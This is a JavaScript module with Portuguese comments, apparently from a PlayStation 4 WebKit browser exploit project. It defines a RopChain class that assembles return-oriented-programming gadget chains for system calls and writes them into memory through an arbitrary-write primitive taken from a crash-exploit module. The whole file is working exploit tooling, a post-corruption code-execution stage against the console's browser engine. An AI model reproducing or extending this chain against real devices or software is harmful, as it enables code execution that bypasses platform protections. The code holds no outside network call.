// js/rop.mjs (NOVO - Módulo Auxiliar para ROP)

import { AdvancedInt64 } from './utils.mjs';
import { arb_write } from './script3/testArrayBufferVictimCrash.mjs';
import { WEBKIT_LIBRARY_INFO } from './config.mjs'; // Usaremos os gadgets daqui

export class RopChain {
    constructor(base_address) {
        this.base = base_address;
        this.stack = [];
        this.gadgets = WEBKIT_LIBRARY_INFO.ROP_GADGETS; // Pega os gadgets do config
        this.syscall_gadget = this.gadgets.syscall;
    }

    push(value) {
        if (typeof value === 'string') { // Assume que é um nome de gadget
            if (!this.gadgets[value]) throw new Error(`Gadget ROP '${value}' não encontrado em config.mjs`);
            this.stack.push(this.gadgets[value]);
        } else {
            this.stack.push(new AdvancedInt64(value));
        }
    }

    // Adiciona uma chamada de sistema à cadeia ROP
    push_syscall(syscall_number, ...args) {
        // A ordem dos registradores para syscalls no PS4 é: rdi, rsi, rdx, rcx, r8, r9
        const registers = ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'];
        if (args.length > registers.length) throw new Error("Muitos argumentos para a syscall");
        
        // 1. Põe o número da syscall em rax
        this.push('pop_rax');
        this.push(syscall_number);

        // 2. Põe os argumentos nos registradores
        for (let i = 0; i < args.length; i++) {
            this.push(`pop_${registers[i]}`);
            this.push(args[i]);
        }

        // 3. Executa a syscall
        this.push(this.syscall_gadget);
    }
    
    // Escreve a cadeia ROP na memória
    writeToMemory() {
        if (!window.arb_write) throw new Error("A primitiva arb_write não está disponível.");
        const buffer = new ArrayBuffer(this.stack.length * 8);
        const view = new DataView(buffer);
        
        for (let i = 0; i < this.stack.length; i++) {
            const val = this.stack[i];
            view.setUint32(i * 8, val.low(), true);
            view.setUint32(i * 8 + 4, val.high(), true);
        }
        
        window.arb_write(this.base, buffer);
        return this.base;
    }
}
